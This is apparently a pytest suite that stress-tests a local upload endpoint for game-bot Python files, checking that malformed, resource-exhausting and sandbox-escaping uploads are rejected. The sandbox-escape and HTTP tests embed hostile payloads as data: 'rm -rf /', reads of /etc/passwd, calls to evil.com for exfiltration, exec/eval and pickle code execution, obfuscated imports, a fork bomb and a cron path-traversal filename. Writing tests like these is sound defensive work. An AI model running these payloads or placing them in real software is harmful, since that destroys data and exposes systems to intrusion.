"""
stress tests for bot file upload endpoint.
covers: malformed files, resource exhaustion, sandbox escape, timeout, and edge cases.

usage:
    pip install requests pytest
    pytest test_bot_upload.py -v

set UPLOAD_URL to your actual endpoint before running.
"""

import io
import os
import math
import time
import threading
import textwrap
import requests
import pytest

UPLOAD_URL = "http://localhost:5000/play/slimevolleyball"
TIMEOUT_SECONDS = 10  # max time we expect a response in
MAX_WORKERS = 20  # for concurrency tests


def upload(content: str | bytes, filename="bot.py", content_type="text/plain"):
    """helper to post a file to the upload endpoint."""
    if isinstance(content, str):
        content = content.encode()
    return requests.post(
        UPLOAD_URL,
        files={"file": (filename, io.BytesIO(content), content_type)},
        timeout=TIMEOUT_SECONDS,
    )


# ---------------------------------------------------------------------------
# valid baseline
# ---------------------------------------------------------------------------

class TestValidUpload:
    def test_minimal_valid_bot(self):
        code = textwrap.dedent("""\
            import math
            from enum import IntEnum

            class Agent:
                def getAction(self, inputs):
                    your_position = inputs["your_position"]
                    opponent_position = inputs["opponent_position"]
                    ball_position = inputs["ball_position"]
                    ball_velocity = inputs["ball_velocity"]
                    action = [0, 1]
                    return action
        """)
        r = upload(code)
        assert r.status_code == 200

    def test_valid_bot_with_logic(self):
        code = textwrap.dedent("""\
            import math

            class Agent:
                def getAction(self, inputs):
                    bp = inputs["ball_position"]
                    yp = inputs["your_position"]
                    dx = bp[0] - yp[0]
                    dy = bp[1] - yp[1]
                    dist = math.sqrt(dx**2 + dy**2)
                    return [1 if dx > 0 else -1, 1 if dy > 0 else -1]
        """)
        r = upload(code)
        assert r.status_code == 200


# ---------------------------------------------------------------------------
# structural / syntax errors (accidental)
# ---------------------------------------------------------------------------

class TestMalformedPython:
    def test_syntax_error(self):
        r = upload("class Agent:\n    def getAction(self inputs):\n        return [0,1]")
        assert r.status_code != 200

    def test_empty_file(self):
        r = upload("")
        assert r.status_code != 200

    def test_whitespace_only(self):
        r = upload("   \n\t\n   ")
        assert r.status_code != 200

    def test_missing_agent_class(self):
        r = upload("def getAction(inputs):\n    return [0, 1]")
        assert r.status_code != 200

    def test_missing_getaction_method(self):
        r = upload("class Agent:\n    pass")
        assert r.status_code != 200

    def test_getaction_wrong_signature(self):
        # no inputs param
        r = upload("class Agent:\n    def getAction(self):\n        return [0, 1]")
        assert r.status_code != 200

    def test_wrong_return_type_hint(self):
        # returns a string instead of list
        code = textwrap.dedent("""\
            class Agent:
                def getAction(self, inputs):
                    return "up"
        """)
        r = upload(code)
        # server should either reject at upload or catch at runtime
        assert r.status_code in (200, 400, 422)

    def test_indentation_error(self):
        r = upload("class Agent:\ndef getAction(self, inputs):\n    return [0,1]")
        assert r.status_code != 200

    def test_null_bytes_in_file(self):
        code = b"class Agent:\n    def getAction(self, inputs):\n        return [0, 1]\x00\x00"
        r = upload(code)
        assert r.status_code != 200

    def test_unicode_bomb(self):
        # deeply nested unicode that can cause parser issues
        code = "# " + "\u202e" * 10000 + "\nclass Agent:\n    def getAction(self, inputs):\n        return [0,1]"
        r = upload(code)
        assert r.status_code != 200

    def test_not_python_at_all(self):
        r = upload("<html><body>not python</body></html>", filename="bot.html")
        assert r.status_code != 200

    def test_json_file(self):
        r = upload('{"agent": "bot"}', filename="bot.json", content_type="application/json")
        assert r.status_code != 200

    def test_binary_file(self):
        r = upload(os.urandom(1024), filename="bot.pyc", content_type="application/octet-stream")
        assert r.status_code != 200


# ---------------------------------------------------------------------------
# resource exhaustion (accidental and malicious)
# ---------------------------------------------------------------------------

class TestResourceExhaustion:
    def test_large_file(self):
        # 10mb of valid-looking python (padding in comments)
        padding = "# " + "a" * 1000 + "\n"
        code = padding * 10_000 + textwrap.dedent("""\
            class Agent:
                def getAction(self, inputs):
                    return [0, 1]
        """)
        r = upload(code)
        # should be rejected as too large, not accepted or hung
        assert r.status_code in (400, 413, 422)

    def test_deeply_nested_ast(self):
        # creates a deeply nested expression that can blow up ast parsing
        nested = "1 + " * 5000 + "1"
        code = f"class Agent:\n    def getAction(self, inputs):\n        return [{nested}]"
        r = upload(code)
        assert r.status_code != 200 or r.elapsed.total_seconds() < TIMEOUT_SECONDS

    def test_infinite_loop_in_getaction(self):
        code = textwrap.dedent("""\
            class Agent:
                def getAction(self, inputs):
                    while True:
                        pass
        """)
        start = time.time()
        r = upload(code)
        elapsed = time.time() - start
        # either rejected at upload or timed out gracefully (not hung forever)
        assert r.status_code != 200 or elapsed < TIMEOUT_SECONDS * 2

    def test_infinite_recursion(self):
        code = textwrap.dedent("""\
            class Agent:
                def getAction(self, inputs):
                    return self.getAction(inputs)
        """)
        r = upload(code)
        assert r.status_code != 200 or r.elapsed.total_seconds() < TIMEOUT_SECONDS

    def test_sleep_in_getaction(self):
        code = textwrap.dedent("""\
            import time

            class Agent:
                def getAction(self, inputs):
                    time.sleep(9999)
                    return [0, 1]
        """)
        start = time.time()
        r = upload(code)
        elapsed = time.time() - start
        assert elapsed < TIMEOUT_SECONDS * 2

    def test_memory_bomb(self):
        code = textwrap.dedent("""\
            class Agent:
                def getAction(self, inputs):
                    x = bytearray(10 * 1024 * 1024 * 1024)  # 10gb
                    return [0, 1]
        """)
        r = upload(code)
        assert r.status_code != 200 or r.elapsed.total_seconds() < TIMEOUT_SECONDS

    def test_fork_bomb(self):
        code = textwrap.dedent("""\
            import os

            class Agent:
                def getAction(self, inputs):
                    while True:
                        os.fork()
        """)
        r = upload(code)
        assert r.status_code != 200

    def test_cpu_intensive_primes(self):
        code = textwrap.dedent("""\
            class Agent:
                def getAction(self, inputs):
                    n = 10**9
                    primes = []
                    for i in range(2, n):
                        if all(i % j != 0 for j in range(2, i)):
                            primes.append(i)
                    return [0, 1]
        """)
        start = time.time()
        r = upload(code)
        elapsed = time.time() - start
        assert elapsed < TIMEOUT_SECONDS * 2


# ---------------------------------------------------------------------------
# sandbox escape / malicious code
# ---------------------------------------------------------------------------

class TestSandboxEscape:
    def test_os_system_call(self):
        code = textwrap.dedent("""\
            import os

            class Agent:
                def getAction(self, inputs):
                    os.system("rm -rf /")
                    return [0, 1]
        """)
        r = upload(code)
        assert r.status_code != 200

    def test_subprocess_call(self):
        code = textwrap.dedent("""\
            import subprocess

            class Agent:
                def getAction(self, inputs):
                    subprocess.run(["cat", "/etc/passwd"])
                    return [0, 1]
        """)
        r = upload(code)
        assert r.status_code != 200

    def test_file_read(self):
        code = textwrap.dedent("""\
            class Agent:
                def getAction(self, inputs):
                    with open("/etc/passwd") as f:
                        data = f.read()
                    return [0, 1]
        """)
        r = upload(code)
        assert r.status_code != 200

    def test_file_write(self):
        code = textwrap.dedent("""\
            class Agent:
                def getAction(self, inputs):
                    with open("/tmp/pwned", "w") as f:
                        f.write("hacked")
                    return [0, 1]
        """)
        r = upload(code)
        assert r.status_code != 200

    def test_network_request(self):
        code = textwrap.dedent("""\
            import urllib.request

            class Agent:
                def getAction(self, inputs):
                    urllib.request.urlopen("http://evil.com/exfil")
                    return [0, 1]
        """)
        r = upload(code)
        assert r.status_code != 200

    def test_socket_connect(self):
        code = textwrap.dedent("""\
            import socket

            class Agent:
                def getAction(self, inputs):
                    s = socket.socket()
                    s.connect(("evil.com", 80))
                    return [0, 1]
        """)
        r = upload(code)
        assert r.status_code != 200

    def test_builtins_exec(self):
        code = textwrap.dedent("""\
            class Agent:
                def getAction(self, inputs):
                    exec("import os; os.system('id')")
                    return [0, 1]
        """)
        r = upload(code)
        assert r.status_code != 200

    def test_builtins_eval(self):
        code = textwrap.dedent("""\
            class Agent:
                def getAction(self, inputs):
                    eval("__import__('os').system('id')")
                    return [0, 1]
        """)
        r = upload(code)
        assert r.status_code != 200

    def test_import_via_importlib(self):
        code = textwrap.dedent("""\
            import importlib

            class Agent:
                def getAction(self, inputs):
                    os = importlib.import_module("os")
                    os.system("id")
                    return [0, 1]
        """)
        r = upload(code)
        assert r.status_code != 200

    def test_dunder_class_escape(self):
        # attempts to walk class hierarchy to get to builtins
        code = textwrap.dedent("""\
            class Agent:
                def getAction(self, inputs):
                    builtins = {}.__class__.__bases__[0].__subclasses__()
                    return [0, 1]
        """)
        r = upload(code)
        assert r.status_code != 200

    def test_ctypes_import(self):
        code = textwrap.dedent("""\
            import ctypes

            class Agent:
                def getAction(self, inputs):
                    ctypes.CDLL(None)
                    return [0, 1]
        """)
        r = upload(code)
        assert r.status_code != 200

    def test_multiprocessing_spawn(self):
        code = textwrap.dedent("""\
            import multiprocessing

            class Agent:
                def getAction(self, inputs):
                    p = multiprocessing.Process(target=lambda: None)
                    p.start()
                    return [0, 1]
        """)
        r = upload(code)
        assert r.status_code != 200

    def test_thread_spawn(self):
        code = textwrap.dedent("""\
            import threading

            class Agent:
                def getAction(self, inputs):
                    t = threading.Thread(target=lambda: None)
                    t.start()
                    return [0, 1]
        """)
        r = upload(code)
        assert r.status_code != 200

    def test_obfuscated_import(self):
        # base64-encoded os import
        code = textwrap.dedent("""\
            import base64

            class Agent:
                def getAction(self, inputs):
                    mod = __import__(base64.b64decode(b'b3M=').decode())
                    mod.system("id")
                    return [0, 1]
        """)
        r = upload(code)
        assert r.status_code != 200

    def test_pickle_deserialization(self):
        code = textwrap.dedent("""\
            import pickle

            class Agent:
                def getAction(self, inputs):
                    pickle.loads(b"cos\\nsystem\\n(S'id'\\ntR.")
                    return [0, 1]
        """)
        r = upload(code)
        assert r.status_code != 200


# ---------------------------------------------------------------------------
# concurrency / ddos
# ---------------------------------------------------------------------------

class TestConcurrency:
    def test_concurrent_valid_uploads(self):
        code = textwrap.dedent("""\
            class Agent:
                def getAction(self, inputs):
                    return [0, 1]
        """)
        results = []

        def do_upload():
            try:
                r = upload(code)
                results.append(r.status_code)
            except Exception as e:
                results.append(str(e))

        threads = [threading.Thread(target=do_upload) for _ in range(MAX_WORKERS)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=TIMEOUT_SECONDS * 2)

        # server should not crash; all responses should be valid http
        assert all(isinstance(s, int) for s in results), f"some requests failed: {results}"

    def test_concurrent_malicious_uploads(self):
        code = textwrap.dedent("""\
            class Agent:
                def getAction(self, inputs):
                    while True:
                        pass
        """)
        results = []

        def do_upload():
            try:
                r = upload(code)
                results.append(r.status_code)
            except requests.exceptions.Timeout:
                results.append("timeout")
            except Exception as e:
                results.append(str(e))

        threads = [threading.Thread(target=do_upload) for _ in range(MAX_WORKERS)]
        for t in threads:
            t.start()
        for t in threads:
            t.join(timeout=TIMEOUT_SECONDS * 3)

        # server must still be alive after this
        try:
            health = requests.get(UPLOAD_URL, timeout=5)
            assert health.status_code < 500
        except Exception:
            pytest.fail("server appears down after concurrent malicious uploads")


# ---------------------------------------------------------------------------
# http-level edge cases
# ---------------------------------------------------------------------------

class TestHTTPEdgeCases:
    def test_no_file_field(self):
        r = requests.post(UPLOAD_URL, data={"not_a_file": "value"}, timeout=TIMEOUT_SECONDS)
        assert r.status_code in (400, 422)

    def test_empty_filename(self):
        r = requests.post(
            UPLOAD_URL,
            files={"file": ("", io.BytesIO(b"class Agent:\n    def getAction(self, inputs):\n        return [0,1]"), "text/plain")},
            timeout=TIMEOUT_SECONDS,
        )
        assert r.status_code in (200, 400, 422)

    def test_double_extension_filename(self):
        code = b"class Agent:\n    def getAction(self, inputs):\n        return [0,1]"
        r = upload(code, filename="bot.py.exe")
        assert r.status_code != 200

    def test_path_traversal_filename(self):
        code = b"class Agent:\n    def getAction(self, inputs):\n        return [0,1]"
        r = upload(code, filename="../../etc/cron.d/pwned.py")
        assert r.status_code != 200

    def test_very_long_filename(self):
        code = b"class Agent:\n    def getAction(self, inputs):\n        return [0,1]"
        r = upload(code, filename="a" * 512 + ".py")
        assert r.status_code in (200, 400, 413, 422)

    def test_content_type_spoofing(self):
        # malicious file pretending to be an image
        code = b"import os\nclass Agent:\n    def getAction(self, inputs):\n        os.system('id')\n        return [0,1]"
        r = upload(code, filename="bot.png", content_type="image/png")
        assert r.status_code != 200

    def test_zip_bomb_disguised_as_py(self):
        # a zip bomb wont be valid python, but upload should reject cleanly
        bomb = b"PK" + b"\x00" * 1024  # fake zip header
        r = upload(bomb, filename="bot.py")
        assert r.status_code != 200